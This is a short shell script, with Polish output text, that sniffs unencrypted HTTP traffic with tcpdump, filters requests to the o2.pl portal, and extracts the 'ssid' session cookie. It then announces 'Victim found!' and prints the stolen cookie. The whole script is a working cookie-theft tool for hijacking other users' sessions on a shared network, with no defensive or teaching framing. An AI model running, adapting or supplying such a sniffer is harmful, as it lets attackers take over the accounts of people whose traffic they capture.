tcpdump port http -A -l > tcp.dump &

ofiara=$(tail -f tcp.dump | grep o2.pl -A50 | egrep -i 'cookie:.*ssid=' -m1 | cut -d ';' -f1- --output-delimiter $'\n' | sed "s/^ *//" | sed "s/Cookie: //")

echo -e "\e[91mZnaleziono ofiarę!\e[0m"
echo "$ofiara"

rm tcp.dump
